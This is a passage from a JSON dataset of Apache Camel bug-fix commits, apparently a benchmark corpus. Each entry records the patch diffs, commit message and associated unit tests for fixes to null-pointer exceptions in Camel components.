                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/ProcessorDefinitionHelper.java?ref=36e7b6681f8817a2b3baf0a30bd82ec14789b32a",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/model/ProcessorDefinitionHelper.java",
                "patch": "@@ -31,6 +31,7 @@\n import org.apache.camel.Exchange;\n import org.apache.camel.spi.ExecutorServiceManager;\n import org.apache.camel.spi.RouteContext;\n+import org.apache.camel.util.CamelContextHelper;\n import org.apache.camel.util.IntrospectionSupport;\n import org.apache.camel.util.ObjectHelper;\n import org.slf4j.Logger;\n@@ -524,6 +525,9 @@ public static void resolvePropertyPlaceholders(RouteContext routeContext, Object\n                     String local = key.getLocalPart();\n                     Object value = processorDefinition.getOtherAttributes().get(key);\n                     if (value != null && value instanceof String) {\n+                        // enforce a properties component to be created if none existed\n+                        CamelContextHelper.lookupPropertiesComponent(routeContext.getCamelContext(), true);\n+\n                         // value must be enclosed with placeholder tokens\n                         String s = (String) value;\n                         String prefixToken = routeContext.getCamelContext().getPropertyPrefixToken();",
                "raw_url": "https://github.com/apache/camel/raw/36e7b6681f8817a2b3baf0a30bd82ec14789b32a/camel-core/src/main/java/org/apache/camel/model/ProcessorDefinitionHelper.java",
                "sha": "5ba236b5d17215625050add3a44c64f5a4a6c382",
                "status": "modified"
            },
            {
                "additions": 27,
                "blob_url": "https://github.com/apache/camel/blob/36e7b6681f8817a2b3baf0a30bd82ec14789b32a/camel-core/src/main/java/org/apache/camel/util/CamelContextHelper.java",
                "changes": 27,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/CamelContextHelper.java?ref=36e7b6681f8817a2b3baf0a30bd82ec14789b32a",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/util/CamelContextHelper.java",
                "patch": "@@ -35,6 +35,7 @@\n import org.apache.camel.Exchange;\n import org.apache.camel.NoSuchBeanException;\n import org.apache.camel.NoSuchEndpointException;\n+import org.apache.camel.component.properties.PropertiesComponent;\n import org.apache.camel.spi.ClassResolver;\n import org.apache.camel.spi.RouteStartupOrder;\n import org.slf4j.Logger;\n@@ -477,4 +478,30 @@ public static int getRouteStartupOrder(CamelContext camelContext, String routeId\n         return 0;\n     }\n \n+    /**\n+     * Lookup the {@link org.apache.camel.component.properties.PropertiesComponent} from the {@link org.apache.camel.CamelContext}.\n+     * <p/>\n+     * @param camelContext the camel context\n+     * @param autoCreate whether to automatic create a new default {@link org.apache.camel.component.properties.PropertiesComponent} if no custom component\n+     *                   has been configured.\n+     * @return the properties component, or <tt>null</tt> if none has been defined, and auto create is <tt>false</tt>.\n+     */\n+    public static Component lookupPropertiesComponent(CamelContext camelContext, boolean autoCreate) {\n+        // no existing properties component so lookup and add as component if possible\n+        PropertiesComponent answer = (PropertiesComponent) camelContext.hasComponent(\"properties\");\n+        if (answer == null) {\n+            answer = camelContext.getRegistry().lookupByNameAndType(\"properties\", PropertiesComponent.class);\n+            if (answer != null) {\n+                camelContext.addComponent(\"properties\", answer);\n+            }\n+        }\n+        if (answer == null && autoCreate) {\n+            // create a default properties component to be used as there may be default values we can use\n+            LOG.info(\"No existing PropertiesComponent has been configured, creating a new default PropertiesComponent with name: properties\");\n+            answer = camelContext.getComponent(\"properties\", PropertiesComponent.class);\n+        }\n+        return answer;\n+    }\n+\n+\n }",
                "raw_url": "https://github.com/apache/camel/raw/36e7b6681f8817a2b3baf0a30bd82ec14789b32a/camel-core/src/main/java/org/apache/camel/util/CamelContextHelper.java",
                "sha": "097ed29e76442c34be96889183a288cf59919947",
                "status": "modified"
            }
        ],
        "message": "CAMEL-8125: Avoid potential NPE when using @PropertyInject with Camel main.",
        "parent": "https://github.com/apache/camel/commit/07caaa4f39112deca295a6677402fec9d3fc4019",
        "patched_files": [
            "CamelPostProcessorHelper.java",
            "ProcessorDefinitionHelper.java",
            "DefaultCamelContext.java",
            "CamelContextHelper.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CamelContextHelperTest.java",
            "DefaultCamelContextTest.java",
            "CamelPostProcessorHelperTest.java",
            "ProcessorDefinitionHelperTest.java"
        ]
    },
    "camel_384751e": {
        "bug_id": "camel_384751e",
        "commit": "https://github.com/apache/camel/commit/384751e1a1b3eae0213190823f36643b39229450",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/384751e1a1b3eae0213190823f36643b39229450/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=384751e1a1b3eae0213190823f36643b39229450",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -1878,7 +1878,7 @@ protected synchronized void stopRouteService(RouteService routeService, boolean\n     protected void logRouteState(Route route, String state) {\n         if (log.isInfoEnabled()) {\n             if (route.getConsumer() != null) {\n-                log.info(\"Route: {} {}, was consuming from: {}\", route.getId(), state, route.getConsumer().getEndpoint());\n+                log.info(\"Route: {} {}, was consuming from: {}\", new Object[]{route.getId(), state, route.getConsumer().getEndpoint()});\n             } else {\n                 log.info(\"Route: {} {}.\", route.getId(), state);\n             }",
                "raw_url": "https://github.com/apache/camel/raw/384751e1a1b3eae0213190823f36643b39229450/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "2e791cf4d4c8277d4e04c538c21aabd1a447ed19",
                "status": "modified"
            }
        ],
        "message": "CAMEL-5830 fix the NPE when the shutdown the route which is not started rightly.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1414857 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/a04674f20f294944b3ee7c6768a482c7dc337d8a",
        "patched_files": [
            "DefaultCamelContext.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCamelContextTest.java"
        ]
    },
    "camel_3894426": {
        "bug_id": "camel_3894426",
        "commit": "https://github.com/apache/camel/commit/3894426a097bef6af02c3b3806e0825ce7acce5e",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/3894426a097bef6af02c3b3806e0825ce7acce5e/camel-core/src/main/java/org/apache/camel/impl/ZipDataFormat.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/ZipDataFormat.java?ref=3894426a097bef6af02c3b3806e0825ce7acce5e",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/ZipDataFormat.java",
                "patch": "@@ -41,7 +41,8 @@ public ZipDataFormat(int compressionLevel) {\n     }\n \n     public void marshal(Exchange exchange, Object graph, OutputStream stream) throws Exception {\n-        InputStream is = exchange.getContext().getTypeConverter().convertTo(InputStream.class, graph);\n+        // ask for a mandatoy type converter to avoid a possible NPE beforehand as we do copy from the InputStream\n+        InputStream is = exchange.getContext().getTypeConverter().mandatoryConvertTo(InputStream.class, graph);\n \n         DeflaterOutputStream zipOutput = new DeflaterOutputStream(stream, new Deflater(compressionLevel));\n         try {",
                "raw_url": "https://github.com/apache/camel/raw/3894426a097bef6af02c3b3806e0825ce7acce5e/camel-core/src/main/java/org/apache/camel/impl/ZipDataFormat.java",
                "sha": "fbc7b59bbe8dc54200875f88b24e31e0c785398c",
                "status": "modified"
            },
            {
                "additions": 13,
                "blob_url": "https://github.com/apache/camel/blob/3894426a097bef6af02c3b3806e0825ce7acce5e/camel-core/src/test/java/org/apache/camel/impl/ZipDataFormatTest.java",
                "changes": 13,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/impl/ZipDataFormatTest.java?ref=3894426a097bef6af02c3b3806e0825ce7acce5e",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/impl/ZipDataFormatTest.java",
                "patch": "@@ -23,9 +23,11 @@\n import org.apache.camel.ContextTestSupport;\n import org.apache.camel.Exchange;\n import org.apache.camel.Message;\n+import org.apache.camel.NoTypeConversionAvailableException;\n import org.apache.camel.Processor;\n import org.apache.camel.builder.RouteBuilder;\n import org.apache.camel.component.mock.MockEndpoint;\n+import org.apache.camel.spi.DataFormat;\n \n /**\n  * Unit test of the zip data format.\n@@ -50,6 +52,17 @@ public boolean isUseRouteBuilder() {\n         return false;\n     }\n \n+    public void testMarshalMandatoryConversionFailed() throws Exception {\n+        DataFormat dataFormat = new ZipDataFormat();\n+\n+        try {\n+            dataFormat.marshal(new DefaultExchange(new DefaultCamelContext()), new Object(), new ByteArrayOutputStream());\n+            fail(\"Should have thrown an exception\");\n+        } catch (NoTypeConversionAvailableException e) {\n+            // expected\n+        }\n+    }\n+\n     private void sendText() throws Exception {\n         template.send(\"direct:start\", new Processor() {\n             public void process(Exchange exchange) throws Exception {",
                "raw_url": "https://github.com/apache/camel/raw/3894426a097bef6af02c3b3806e0825ce7acce5e/camel-core/src/test/java/org/apache/camel/impl/ZipDataFormatTest.java",
                "sha": "a9eb005b2c954ef7774706e38122b4107bac6682",
                "status": "modified"
            }
        ],
        "message": "ZipDataFormat.marshal() should better ask for a mandatory conversion to avoid possible NPE.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1243995 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/0cf06b64993d04e01d58b195582e7f0343f5607e",
        "patched_files": [
            "ZipDataFormat.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ZipDataFormatTest.java"
        ]
    },
    "camel_39509af": {
        "bug_id": "camel_39509af",
        "commit": "https://github.com/apache/camel/commit/39509af13790d3baaa6af383c35e509d01c92f6c",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/39509af13790d3baaa6af383c35e509d01c92f6c/components/camel-soap/src/main/java/org/apache/camel/dataformat/soap/name/ServiceInterfaceStrategy.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-soap/src/main/java/org/apache/camel/dataformat/soap/name/ServiceInterfaceStrategy.java?ref=39509af13790d3baaa6af383c35e509d01c92f6c",
                "deletions": 2,
                "filename": "components/camel-soap/src/main/java/org/apache/camel/dataformat/soap/name/ServiceInterfaceStrategy.java",
                "patch": "@@ -96,7 +96,6 @@ private TypeInfo getOutInfo(Method method) {\n         // parameter types are returned in declaration order\n         Class<?>[] types = method.getParameterTypes();\n         if (types.length == 0) {\n-            typeInfos.add(new TypeInfo(null, null));\n             return typeInfos;\n         }\n         if (requestWrapper != null && requestWrapper.className() != null) {\n@@ -140,7 +139,7 @@ private TypeInfo getOutInfo(Method method) {\n      * Determines how the parameter object of the service method will be named\n      * in xml. It will use either the RequestWrapper annotation of the method if\n      * present or the WebParam method of the parameter.\n-     * \n+     *\n      * @param method\n      */\n     private MethodInfo analyzeMethod(Method method) {",
                "raw_url": "https://github.com/apache/camel/raw/39509af13790d3baaa6af383c35e509d01c92f6c/components/camel-soap/src/main/java/org/apache/camel/dataformat/soap/name/ServiceInterfaceStrategy.java",
                "sha": "15884b806af448e8abb4064c589ace7411ae95b9",
                "status": "modified"
            }
        ],
        "message": "CAMEL-6720: Fixed potential NPE in camel-soap. Thanks to Movees  for the fix.",
        "parent": "https://github.com/apache/camel/commit/ef74ad512a44f94f0ebe58670419c5d914cadfb3",
        "patched_files": [
            "ServiceInterfaceStrategy.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ServiceInterfaceStrategyTest.java"
        ]
    },
    "camel_398af3d": {
        "bug_id": "camel_398af3d",
        "commit": "https://github.com/apache/camel/commit/398af3d4b9a3a0f1ec935efb4b9dedb814901e73",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/398af3d4b9a3a0f1ec935efb4b9dedb814901e73/components/camel-websocket/src/main/java/org/apache/camel/component/websocket/WebsocketComponent.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-websocket/src/main/java/org/apache/camel/component/websocket/WebsocketComponent.java?ref=398af3d4b9a3a0f1ec935efb4b9dedb814901e73",
                "deletions": 4,
                "filename": "components/camel-websocket/src/main/java/org/apache/camel/component/websocket/WebsocketComponent.java",
                "patch": "@@ -187,10 +187,6 @@ public void connect(WebsocketProducerConsumer prodcon) throws Exception {\n                 enableSessionSupport(connectorRef.server, connectorKey);\n             }\n \n-            if (prodcon instanceof WebsocketConsumer) {\n-                // connect websocket consumer, to servlet\n-                connectorRef.servlet.connect((WebsocketConsumer) prodcon);\n-            }\n         }\n \n     }\n@@ -426,6 +422,8 @@ protected WebsocketComponentServlet addServlet(NodeSynchronization sync, Websock\n             if (servlet.getConsumer() == null) {\n                 servlet.setConsumer(consumer);\n             }\n+            // registry the consumer here\n+            servlet.connect(consumer);\n             return servlet;\n         } else {\n             throw new Exception(\"Jetty instance has not been retrieved for : \" + key);",
                "raw_url": "https://github.com/apache/camel/raw/398af3d4b9a3a0f1ec935efb4b9dedb814901e73/components/camel-websocket/src/main/java/org/apache/camel/component/websocket/WebsocketComponent.java",
                "sha": "7108160ebe0f32deade1452d536fba37dc964f87",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/398af3d4b9a3a0f1ec935efb4b9dedb814901e73/components/camel-websocket/src/main/java/org/apache/camel/component/websocket/WebsocketEndpoint.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-websocket/src/main/java/org/apache/camel/component/websocket/WebsocketEndpoint.java?ref=398af3d4b9a3a0f1ec935efb4b9dedb814901e73",
                "deletions": 0,
                "filename": "components/camel-websocket/src/main/java/org/apache/camel/component/websocket/WebsocketEndpoint.java",
                "patch": "@@ -89,6 +89,7 @@ public Producer createProducer() throws Exception {\n     public void connect(WebsocketConsumer consumer) throws Exception {\n         component.connect(consumer);\n         component.addServlet(sync, consumer, remaining);\n+        \n     }\n \n     public void disconnect(WebsocketConsumer consumer) throws Exception {",
                "raw_url": "https://github.com/apache/camel/raw/398af3d4b9a3a0f1ec935efb4b9dedb814901e73/components/camel-websocket/src/main/java/org/apache/camel/component/websocket/WebsocketEndpoint.java",
                "sha": "8f245ef6f8b7f13a30385d6c57c80ede9150e21e",
                "status": "modified"
            },
            {
                "additions": 88,
                "blob_url": "https://github.com/apache/camel/blob/398af3d4b9a3a0f1ec935efb4b9dedb814901e73/components/camel-websocket/src/test/java/org/apache/camel/component/websocket/WebsocketConsumerRouteTest.java",
                "changes": 88,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-websocket/src/test/java/org/apache/camel/component/websocket/WebsocketConsumerRouteTest.java?ref=398af3d4b9a3a0f1ec935efb4b9dedb814901e73",
                "deletions": 0,
                "filename": "components/camel-websocket/src/test/java/org/apache/camel/component/websocket/WebsocketConsumerRouteTest.java",
                "patch": "@@ -0,0 +1,88 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.websocket;\n+\n+import com.ning.http.client.AsyncHttpClient;\n+import com.ning.http.client.websocket.WebSocket;\n+import com.ning.http.client.websocket.WebSocketTextListener;\n+import com.ning.http.client.websocket.WebSocketUpgradeHandler;\n+\n+import java.util.ArrayList;\n+import java.util.List;\n+import java.util.concurrent.CountDownLatch;\n+import java.util.concurrent.TimeUnit;\n+\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+import org.apache.camel.test.junit4.CamelTestSupport;\n+import org.junit.Test;\n+\n+public class WebsocketConsumerRouteTest extends CamelTestSupport {\n+    \n+    @Test\n+    public void testWSHttpCall() throws Exception {\n+        AsyncHttpClient c = new AsyncHttpClient();\n+\n+        WebSocket websocket = c.prepareGet(\"ws://127.0.0.1:9292/echo\").execute(\n+            new WebSocketUpgradeHandler.Builder()\n+                .addWebSocketListener(new WebSocketTextListener() {\n+                    @Override\n+                    public void onMessage(String message) {\n+                        \n+                    }\n+\n+                    @Override\n+                    public void onFragment(String fragment, boolean last) {\n+                    }\n+\n+                    @Override\n+                    public void onOpen(WebSocket websocket) {\n+                    }\n+\n+                    @Override\n+                    public void onClose(WebSocket websocket) {\n+                    }\n+\n+                    @Override\n+                    public void onError(Throwable t) {\n+                        t.printStackTrace();\n+                    }\n+                }).build()).get();\n+        \n+        MockEndpoint result = getMockEndpoint(\"mock:result\");\n+        result.expectedBodiesReceived(\"Test\");\n+\n+        websocket.sendTextMessage(\"Test\");\n+\n+        result.assertIsSatisfied();\n+        \n+        websocket.close();\n+        c.close();\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            public void configure() {\n+                from(\"websocket://echo\")\n+                    .log(\">>> Message received from WebSocket Client : ${body}\")\n+                    .to(\"mock:result\");\n+            }\n+        };\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/398af3d4b9a3a0f1ec935efb4b9dedb814901e73/components/camel-websocket/src/test/java/org/apache/camel/component/websocket/WebsocketConsumerRouteTest.java",
                "sha": "628a512d0b3f5d4a98b841084677cbe53b1bd4fb",
                "status": "added"
            }
        ],
        "message": "CAMEL-5908 fixed the NPE issue of starting the Websocket\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1425653 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/f2acb16ad963bc6759814f5f5b0b51d39fcc2e16",
        "patched_files": [
            "WebsocketEndpoint.java",
            "WebsocketComponent.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "WebsocketEndpointTest.java",
            "WebsocketConsumerRouteTest.java",
            "WebsocketComponentTest.java"
        ]
    },
    "camel_39ba278": {
        "bug_id": "camel_39ba278",
        "commit": "https://github.com/apache/camel/commit/39ba2783f0b75fbb49bb800e183e8ecb3a3a8e46",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/39ba2783f0b75fbb49bb800e183e8ecb3a3a8e46/components/camel-restlet/src/test/java/org/apache/camel/component/restlet/RestletRouteBuilderAuthTest.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-restlet/src/test/java/org/apache/camel/component/restlet/RestletRouteBuilderAuthTest.java?ref=39ba2783f0b75fbb49bb800e183e8ecb3a3a8e46",
                "deletions": 0,
                "filename": "components/camel-restlet/src/test/java/org/apache/camel/component/restlet/RestletRouteBuilderAuthTest.java",
                "patch": "@@ -50,6 +50,7 @@ public void testhBasicAuthError() throws IOException {\n         headers.put(\"id\", \"xyz\");\n         String response = (String) template.requestBodyAndHeaders(\"direct:start-auth\", \n                 \"<order foo='1'/>\", headers);\n+        assertNotNull(\"No response\", response);\n         assertTrue(response.contains(\"requires user authentication\"));\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/39ba2783f0b75fbb49bb800e183e8ecb3a3a8e46/components/camel-restlet/src/test/java/org/apache/camel/component/restlet/RestletRouteBuilderAuthTest.java",
                "sha": "60280bddfa42839dbbb58e3401d2143775387ed9",
                "status": "modified"
            }
        ],
        "message": "Fixed NPE in unit test reported by TC.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@782995 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/2f66cdaa1c062ef99be9bfaf91c93069c671bc3d",
        "patched_files": [],
        "repo": "camel",
        "unit_tests": [
            "RestletRouteBuilderAuthTest.java"
        ]
    },
    "camel_3a26b7b": {
        "bug_id": "camel_3a26b7b",
        "commit": "https://github.com/apache/camel/commit/3a26b7ba66c14b897b29dc019e2e9586b61eedc9",
        "file": [
            {
                "additions": 22,
                "blob_url": "https://github.com/apache/camel/blob/3a26b7ba66c14b897b29dc019e2e9586b61eedc9/camel-core/src/main/java/org/apache/camel/builder/DefaultFluentProducerTemplate.java",
                "changes": 22,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/builder/DefaultFluentProducerTemplate.java?ref=3a26b7ba66c14b897b29dc019e2e9586b61eedc9",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/builder/DefaultFluentProducerTemplate.java",
                "patch": "@@ -219,6 +219,10 @@ public Object request() throws CamelExecutionException {\n     public <T> T request(Class<T> type) throws CamelExecutionException {\n         T result;\n         Endpoint target = endpoint != null ? endpoint : defaultEndpoint;\n+        // we must have an endpoint to send to\n+        if (target == null) {\n+            throw new IllegalArgumentException(\"No endpoint configured on FluentProducerTemplate. You can configure an endpoint with to(uri)\");\n+        }\n \n         if (type == Exchange.class) {\n             result = (T)template().request(target, processorSupplier.get());\n@@ -250,6 +254,12 @@ public Object request() throws CamelExecutionException {\n     @Override\n     public <T> Future<T> asyncRequest(Class<T> type) {\n         Endpoint target = endpoint != null ? endpoint : defaultEndpoint;\n+\n+        // we must have an endpoint to send to\n+        if (target == null) {\n+            throw new IllegalArgumentException(\"No endpoint configured on FluentProducerTemplate. You can configure an endpoint with to(uri)\");\n+        }\n+\n         Future<T> result;\n         if (headers != null) {\n             result = template().asyncRequestBodyAndHeaders(target, body, headers, type);\n@@ -267,6 +277,12 @@ public Object request() throws CamelExecutionException {\n     @Override\n     public Exchange send() throws CamelExecutionException {\n         Endpoint target = endpoint != null ? endpoint : defaultEndpoint;\n+\n+        // we must have an endpoint to send to\n+        if (target == null) {\n+            throw new IllegalArgumentException(\"No endpoint configured on FluentProducerTemplate. You can configure an endpoint with to(uri)\");\n+        }\n+\n         return exchangeSupplier != null\n             ? template().send(target, exchangeSupplier.get())\n             : template().send(target, processorSupplier.get());\n@@ -275,6 +291,12 @@ public Exchange send() throws CamelExecutionException {\n     @Override\n     public Future<Exchange> asyncSend() {\n         Endpoint target = endpoint != null ? endpoint : defaultEndpoint;\n+\n+        // we must have an endpoint to send to\n+        if (target == null) {\n+            throw new IllegalArgumentException(\"No endpoint configured on FluentProducerTemplate. You can configure an endpoint with to(uri)\");\n+        }\n+\n         return exchangeSupplier != null\n             ? template().asyncSend(target, exchangeSupplier.get())\n             : template().asyncSend(target, processorSupplier.get());",
                "raw_url": "https://github.com/apache/camel/raw/3a26b7ba66c14b897b29dc019e2e9586b61eedc9/camel-core/src/main/java/org/apache/camel/builder/DefaultFluentProducerTemplate.java",
                "sha": "bac078e6d387a4c0560e1739b924dd528ae45692",
                "status": "modified"
            },
            {
                "additions": 18,
                "blob_url": "https://github.com/apache/camel/blob/3a26b7ba66c14b897b29dc019e2e9586b61eedc9/camel-core/src/test/java/org/apache/camel/builder/FluentProducerTemplateTest.java",
                "changes": 18,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/builder/FluentProducerTemplateTest.java?ref=3a26b7ba66c14b897b29dc019e2e9586b61eedc9",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/builder/FluentProducerTemplateTest.java",
                "patch": "@@ -29,6 +29,24 @@\n  */\n public class FluentProducerTemplateTest extends ContextTestSupport {\n \n+    public void testNoEndpoint() throws Exception {\n+        FluentProducerTemplate fluent = context.createFluentProducerTemplate();\n+\n+        try {\n+            fluent.withBody(\"Hello World\").send();\n+            fail(\"Should have thrown exception\");\n+        } catch (IllegalArgumentException e) {\n+            // expected\n+        }\n+\n+        try {\n+            fluent.withBody(\"Hello World\").request();\n+            fail(\"Should have thrown exception\");\n+        } catch (IllegalArgumentException e) {\n+            // expected\n+        }\n+    }\n+\n     public void testFromCamelContext() throws Exception {\n         MockEndpoint mock = getMockEndpoint(\"mock:result\");\n         mock.expectedBodiesReceived(\"Bye World\");",
                "raw_url": "https://github.com/apache/camel/raw/3a26b7ba66c14b897b29dc019e2e9586b61eedc9/camel-core/src/test/java/org/apache/camel/builder/FluentProducerTemplateTest.java",
                "sha": "4308fc67f1fd34d40b3a567e328791fb162199fd",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE in fluent producer template if no endpoint was configured",
        "parent": "https://github.com/apache/camel/commit/1c70401e99669482231571d826caebf32ad853ed",
        "patched_files": [
            "FluentProducerTemplate.java",
            "DefaultFluentProducerTemplate.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "FluentProducerTemplateTest.java"
        ]
    },
    "camel_3abc6af": {
        "bug_id": "camel_3abc6af",
        "commit": "https://github.com/apache/camel/commit/3abc6af40d1c99e62043acd284514a34bfe7e3e6",
        "file": [
            {
                "additions": 13,
                "blob_url": "https://github.com/apache/camel/blob/3abc6af40d1c99e62043acd284514a34bfe7e3e6/camel-core/src/main/java/org/apache/camel/impl/MessageSupport.java",
                "changes": 22,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/MessageSupport.java?ref=3abc6af40d1c99e62043acd284514a34bfe7e3e6",
                "deletions": 9,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/MessageSupport.java",
                "patch": "@@ -19,6 +19,7 @@\n import org.apache.camel.Exchange;\n import org.apache.camel.Message;\n import org.apache.camel.TypeConverter;\n+import org.apache.camel.CamelContext;\n import org.apache.camel.util.UuidGenerator;\n \n /**\n@@ -52,16 +53,19 @@ public Object getBody() {\n     protected <T> T getBody(Class<T> type, Object body) {\n         Exchange e = getExchange();\n         if (e != null) {\n-            TypeConverter converter = e.getContext().getTypeConverter();\n-            T answer = converter.convertTo(type, body);\n-            if (answer == null) {\n-                // lets first try converting the message itself first\n-                // as for some types like InputStream v Reader its more efficient to do the transformation\n-                // from the Message itself as its got efficient implementations of them, before trying the\n-                // payload\n-                answer = converter.convertTo(type, this);\n+            CamelContext camelContext = e.getContext();\n+            if (camelContext != null) {\n+                TypeConverter converter = camelContext.getTypeConverter();\n+                T answer = converter.convertTo(type, body);\n+                if (answer == null) {\n+                    // lets first try converting the message itself first\n+                    // as for some types like InputStream v Reader its more efficient to do the transformation\n+                    // from the Message itself as its got efficient implementations of them, before trying the\n+                    // payload\n+                    answer = converter.convertTo(type, this);\n+                }\n+                return answer;\n             }\n-            return answer;\n         }\n         return (T)getBody();\n     }",
                "raw_url": "https://github.com/apache/camel/raw/3abc6af40d1c99e62043acd284514a34bfe7e3e6/camel-core/src/main/java/org/apache/camel/impl/MessageSupport.java",
                "sha": "07459ac70eeed204cbd5f13bd8a3147e8e593faa",
                "status": "modified"
            }
        ],
        "message": "avoid NullPointerException if no CamelContext set on an Exchange\n\ngit-svn-id: https://svn.apache.org/repos/asf/activemq/camel/trunk@676641 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/561faab2e80e0175c7def7cd0fd5c9ab3ace8970",
        "patched_files": [
            "MessageSupport.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "MessageSupportTest.java"
        ]
    },
    "camel_3bc26be": {
        "bug_id": "camel_3bc26be",
        "commit": "https://github.com/apache/camel/commit/3bc26bef77b8d91944ebc20d2e46d5c1b4587f34",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/3bc26bef77b8d91944ebc20d2e46d5c1b4587f34/components/camel-undertow/src/main/java/org/apache/camel/component/undertow/UndertowProducer.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-undertow/src/main/java/org/apache/camel/component/undertow/UndertowProducer.java?ref=3bc26bef77b8d91944ebc20d2e46d5c1b4587f34",
                "deletions": 1,
                "filename": "components/camel-undertow/src/main/java/org/apache/camel/component/undertow/UndertowProducer.java",
                "patch": "@@ -128,7 +128,9 @@ public boolean process(final Exchange camelExchange, final AsyncCallback callbac\n         final TypeConverter tc = endpoint.getCamelContext().getTypeConverter();\n         final ByteBuffer bodyAsByte = tc.tryConvertTo(ByteBuffer.class, body);\n \n-        if (body != null) {\n+        // As tryConvertTo is used to convert the body, we should do null check\n+        // or the call bodyAsByte.remaining() may throw an NPE\n+        if (body != null && bodyAsByte != null) {\n             requestHeaders.put(Headers.CONTENT_LENGTH, bodyAsByte.remaining());\n         }\n ",
                "raw_url": "https://github.com/apache/camel/raw/3bc26bef77b8d91944ebc20d2e46d5c1b4587f34/components/camel-undertow/src/main/java/org/apache/camel/component/undertow/UndertowProducer.java",
                "sha": "a4133dffa968168bc105c65d6503e49acff136d4",
                "status": "modified"
            }
        ],
        "message": "CAMEL-11057: Undertow Producer : NPE if tryConvertTo fails to convert exchange body to ByteBuffer",
        "parent": "https://github.com/apache/camel/commit/5586f91c4b5b22b822eebeda8843cefa59d78569",
        "patched_files": [
            "UndertowProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "UndertowProducerTest.java"
        ]
    },
    "camel_3c64927": {
        "bug_id": "camel_3c64927",
        "commit": "https://github.com/apache/camel/commit/3c649276475afdfa5cf584194b0acc653118de87",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/3c649276475afdfa5cf584194b0acc653118de87/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java",
                "changes": 2,
